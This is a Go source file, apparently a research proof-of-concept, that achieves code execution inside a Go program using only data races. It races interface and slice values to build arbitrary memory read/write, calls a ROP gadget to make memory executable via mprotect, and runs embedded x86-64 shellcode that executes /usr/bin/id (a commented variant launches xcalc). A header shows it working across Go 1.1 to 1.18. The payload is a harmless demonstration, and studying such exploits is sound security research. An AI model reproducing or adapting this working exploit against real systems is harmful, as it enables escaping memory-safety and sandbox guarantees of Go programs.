/*
golang code execution without imports using only data races

It works on current tip (Go 1.18), regardless of PIE:
	$ go version
	go version devel go1.18-6178d25fc0 Wed Dec 29 20:20:32 2021 +0000 linux/amd64
	$ go run exploit.go
	uid=1000(user) gid=1000(user) groups=1000(user)
	$ go run -buildmode=pie exploit.go
	uid=1000(user) gid=1000(user) groups=1000(user)

As well as old versions:
	$ for v in 1.{17..8} 1.7.6 1.6.4 1.5.4; do
	    go install golang.org/dl/go${v}@latest >/dev/null 2>&1 || continue
	    go$v download >/dev/null 2>&1
	    go$v version
	    go$v run exploit.go
	  done
	go version go1.17 linux/amd64
	uid=1000(user) gid=1000(user) groups=1000(user)
	go version go1.16 linux/amd64
	uid=1000(user) gid=1000(user) groups=1000(user)
	go version go1.15 linux/amd64
	uid=1000(user) gid=1000(user) groups=1000(user)
	go version go1.14 linux/amd64
	uid=1000(user) gid=1000(user) groups=1000(user)
	go version go1.13 linux/amd64
	uid=1000(user) gid=1000(user) groups=1000(user)
	go version go1.12 linux/amd64
	uid=1000(user) gid=1000(user) groups=1000(user)
	go version go1.11 linux/amd64
	uid=1000(user) gid=1000(user) groups=1000(user)
	go version go1.10 linux/amd64
	uid=1000(user) gid=1000(user) groups=1000(user)
	go version go1.9 linux/amd64
	uid=1000(user) gid=1000(user) groups=1000(user)
	go version go1.8 linux/amd64
	uid=1000(user) gid=1000(user) groups=1000(user)
	go version go1.7.6 linux/amd64
	uid=1000(user) gid=1000(user) groups=1000(user)
	go version go1.6.4 linux/amd64
	uid=1000(user) gid=1000(user) groups=1000(user)
	go version go1.5.4 linux/amd64
	uid=1000(user) gid=1000(user) groups=1000(user)

To test further back we have to compile from source, and also set GOMAXPROCS=2
as the default was 1 before go1.5:
	$ ( git clone -b release-branch.go1.4 --depth 1 https://go.googlesource.com/go go1.4
	    cd go1.4/src
	    ./make.bash )
	$ go1.4/bin/go version
	go version go1.4-bootstrap-20170531 linux/amd64
	$ GOMAXPROCS=2 go1.4/bin/go run exploit.go
	uid=1000(user) gid=1000(user) groups=1000(user)

From there, building from a modern system requires small tweaks:
	$ ( git clone -b release-branch.go1.3 --depth 1 https://go.googlesource.com/go go1.3
	    cd go1.3/src
	    CGO_ENABLED=0 CFLAGS='-Wno-implicit-fallthrough -Wno-shift-negative-value' ./make.bash )
	$ go1.3/bin/go version
	go version go1.3.3 linux/amd64
	$ GOMAXPROCS=2 go1.3/bin/go run exploit.go
	uid=1000(user) gid=1000(user) groups=1000(user)

	$ ( git clone -b release-branch.go1.2 --depth 1 https://go.googlesource.com/go go1.2
	    cd go1.2/src
	    sed -i 's/-Werror//' make.bash
	    sed -i 's/"-Werror",//' cmd/dist/build.c
	    CGO_ENABLED=0 ./make.bash )
	$ go1.2/bin/go version
	go version go1.2.2 linux/amd64
	$ GOMAXPROCS=2 go1.2/bin/go run exploit.go
	uid=1000(user) gid=1000(user) groups=1000(user)

	$ ( git clone -b release-branch.go1.1 --depth 1 https://go.googlesource.com/go go1.1
	    cd go1.1/src
	    sed -i 's/-Werror//' make.bash
	    sed -i 's/"-Werror",//' cmd/dist/build.c
	    CGO_ENABLED=0 ./make.bash )
	$ go1.1/bin/go version
	go version go1.1.2 linux/amd64
	$ GOMAXPROCS=2 go1.1/bin/go run exploit.go
	uid=1000(user) gid=1000(user) groups=1000(user)

Unfortunately I couldn't get go1 to compile on my system (I'm getting a weird
fault), but it probably works as well.
*/
package main

// python -c 'from pwn import *; context(arch="amd64"); print repr(asm(shellcraft.amd64.linux.execve("/usr/bin/id", ["id"], 0)))[1:-1]'
var shellcode = "h.he\x01\x814$\x01\x01\x01\x01H\xb8/usr/binPH\x89\xe7hhe\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05"

// python -c 'from pwn import *; context(arch="amd64"); print repr(asm(shellcraft.amd64.linux.execve("/usr/bin/xcalc", ["xcalc"], {"DISPLAY":":0"})))[1:-1]'
// var shellcode = "H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8.yb`mb\x01\x01H1\x04$H\xb8/usr/binPH\x89\xe7h;1\x01\x01\x814$\x01\x01\x01\x01H\xb8DISPLAY=P1\xd2Rj\x08ZH\x01\xe2RH\x89\xe2H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8yb`mb\x01\x01\x01H1\x04$1\xf6Vj\x08^H\x01\xe6VH\x89\xe6j;X\x0f\x05"

func main() {
	// build arbitrary r/w primitive
	// it exploits the data race 3 times:
	// - 2 times to read the attacker/victim addresses
	// - 1 time to write slice out of bound
	m := arbitraryRW()

	// exploit the data race 1 more time to read the address of main
	// so we can find the gadgets stored as immediates and our shellcode
	//fmt.Printf("[*] racing to read address of main\n")
	mainAddr := addrOfValue(main)
	shellcodeAddr := m.index(mainAddr, 0x100000, []byte(shellcode[:8]))

	find := func(v uint64) uint64 { return m.index(mainAddr, 0x1000, p64s(v)) }

	// get code execution by calling a controlled function pointer
	// exploit the data race 2 more times: read addr of fptr and gadget
	var call func(uint64, uint64, uint64, uint64, uint64, uint64, uint64, uint64, uint64, uint64, uint64, uint64, uint64, uint64)
	callAddr := addrOf(&call)
	//fmt.Printf("[+] call @ 0x%x\n", callAddr)

	// pop rdi; pop rdi; pop rsi; pop rdx; pop rax; syscall; ret
	// pop twice rdi because first will be saved rip from the call
	gadget := find(0xc3050f585a5e5f5f)
	gadgetAddr := addrOf(&gadget)
	//fmt.Printf("[+] gadget @ 0x%x", gadgetAddr)

	m.write8(callAddr, gadgetAddr)
	// this was the most stable way to get code exec across Go versions I found
	// the call is implemented with a 'call reg' but args depend on calling
	// convention, which depends on Go version

	addr := shellcodeAddr & ^(PAGE_SIZE - 1)
	const len = PAGE_SIZE * 2
	const PROT_READ = 1
	const PROT_WRITE = 2
	const PROT_EXEC = 4
	const prot = PROT_READ | PROT_WRITE | PROT_EXEC
	const sys_mprotect = 10
	call(
		// Go < 1.18 calling convention is the stack
		addr,          // rdi
		len,           // rsi
		prot,          // rdx
		sys_mprotect,  // rax
		shellcodeAddr, // ret

		0, 1, 2, 3, // unused

		// Go >= 1.18 calling convention uses registers, then stack
		// luckily for us this does not overlap so we can prepare both
		addr,          // rdi
		len,           // rsi
		prot,          // rdx
		sys_mprotect,  // rax
		shellcodeAddr, // ret
	)

	// in total, we exploited the data race 6 times
	// - 5 times for reading addresses
	// - 1 time for writing out of bounds
}

const PAGE_SIZE = uint64(0x1000)

func arbitraryRW() memory {
	// a slice at address 0 is the nil slice, unusable
	// so create one just after, off by 1
	return sliceAt(1, 0xffffffffffffffff)
}

type memory []byte

func (m memory) read(addr uint64) byte {
	return m[addr-1]
}

func (m memory) write(addr uint64, value byte) {
	m[addr-1] = value
}

func (m memory) write8(addr, value uint64) {
	for i, b := range p64(value) {
		m[addr-1+uint64(i)] = b
	}
}

func (m memory) index(from, max uint64, sep []byte) uint64 {
	for i := from; i < from+max; i++ {
		match := true
		for j := uint64(0); j < uint64(len(sep)); j++ {
			if m.read(i+j) != sep[j] {
				match = false
				break
			}
		}
		if match {
			return i
		}
	}
	return 0
}

type victimSlice struct {
	s []byte
}

func sliceAt(addr, length uint64) []byte {
	// attacker/target are of different types, so allocated in different regions
	// we want to ensure attacker before target, so it can reach it
	// therefore we make targets a contiguous slice of victims
	// it will be large enough to require a new allocation, after attacker
	attacker := make([]uint64, 1)
	targets := make([]victimSlice, 4096) // total size 4096*32
	// we target the first element, i.e. targets[0]
	//fmt.Printf("[*] racing to read address of targets\n")
	targetsAddr := addrOfValue(targets)
	//fmt.Printf("[*] racing to read address of attacker\n")
	attackerAddr := addrOfValue(attacker)
	diff := int64(targetsAddr - attackerAddr)
	if diff < 0 {
		panic("attacker after target")
	}
	long := make([]uint64, diff/8+3)
	idx := diff / 8
	//fmt.Printf("[*] attacker @ %p\n", attacker)
	//fmt.Printf("[*] targets slices @ %p\n", targets)
	//fmt.Printf("[*] racing to write length of targets[0] slice @ %p\n", &targets[0])

	confused := attacker
	dontOptimize := confused
	writes, races := 0, 0
	go func() {
		for {
			for i := 0; i < 10000; i++ {
				// a single goroutine flipping confused exploits the race much
				// faster than having two goroutines alternate on the value
				// however, in modern Go versions we need to avoid the smarter
				// compiler removing both statements because they appear useless
				confused = long
				func() { dontOptimize = confused }()
				confused = attacker
				writes++
			}
			// exit when we won to avoid leaking a cpu intensive goroutine
			// but the check is too expensive for the race loop so we put it outside
			if targets[0].s != nil {
				return
			}
		}
	}()
	for {
		func() {
			defer func() { recover() }()
			// confused points to attacker but still len/cap of long
			confused[idx] = addr
			confused[idx+1] = length // len
			confused[idx+2] = length // cap
		}()
		if targets[0].s != nil && len(targets[0].s) == int(length) && cap(targets[0].s) == int(length) {
			//fmt.Printf("[+] write race won: races=%v, writes=%v\n", races, writes)
			return targets[0].s
		}
		races++
	}
	_ = dontOptimize
	return nil
}

type racerValue interface {
	Value() uint64
}

func raceLeak(address, value racerValue) uint64 {
	confused := value
	dontOptimize := confused
	writes, races := 0, 0
	done := false
	go func() {
		for {
			for i := 0; i < 10000; i++ {
				// a single goroutine flipping confused exploits the race much
				// faster than having two goroutines alternate on the value
				// however, in modern Go versions we need to avoid the smarter
				// compiler removing both statements because they appear useless
				confused = address
				func() { dontOptimize = confused }()
				confused = value
				writes++
			}
			// exit when we won to avoid leaking a cpu intensive goroutine
			// but the check is too expensive for the race loop so we put it outside
			if done {
				return
			}
		}
	}()
	// we want confused to point to the type of the address holder
	// but still have the value of the value holder
	for {
		if v := confused.Value(); v > 0 {
			done = true
			//fmt.Printf("[+] read race won: races=%v, writes=%v, value=0x%x\n", races, writes, v)
			return v
		}
		races++
	}
	_ = dontOptimize
	return 0
}

type holdInterface struct {
	i interface{}
}

func (s holdInterface) Value() uint64 {
	return 0
}

type holdInterfaceAddress struct {
	// an interface is type and address
	// line them up the same so we can leak the address
	typ  uint64
	addr uint64
}

func (s holdInterfaceAddress) Value() uint64 {
	return s.addr
}

type holdInterfaceValue struct {
	// an interface is type and pointer to the value
	// line them up the same so we can leak the value
	typ  uint64
	addr *uint64
}

func (s holdInterfaceValue) Value() uint64 {
	if s.addr != nil {
		return *s.addr
	}
	return 0
}

func addrOf(x interface{}) uint64 {
	return raceLeak(&holdInterface{x}, &holdInterfaceAddress{})
}

func addrOfValue(x interface{}) uint64 {
	return raceLeak(&holdInterface{x}, &holdInterfaceValue{})
}

func parseUint64(s string) uint64 {
	if len(s) > 2 && s[:2] == "0x" {
		s = s[2:]
	}
	var v uint64
	for i := 0; i < len(s); i++ {
		v <<= 4
		if int(s[i]) >= int('0') && int(s[i]) <= int('9') {
			v += uint64(int(s[i]) - int('0'))
		} else if int(s[i]) >= int('a') && int(s[i]) <= int('f') {
			v += uint64(10 + int(s[i]) - int('a'))
		} else if int(s[i]) >= int('A') && int(s[i]) <= int('F') {
			v += uint64(10 + int(s[i]) - int('A'))
		} else {
			panic("unrecognized hex " + s)
		}
	}
	return v
}

func p64(n uint64) []byte {
	s := make([]byte, 8)
	for i := 0; i < 8; i++ {
		s[i] = byte(n & 0xff)
		n >>= 8
	}
	return s
}

func p64s(n uint64) []byte {
	s := make([]byte, 0, 8)
	for byte(n&0xff) != 0 {
		s = append(s, byte(n&0xff))
		n >>= 8
	}
	return s
}
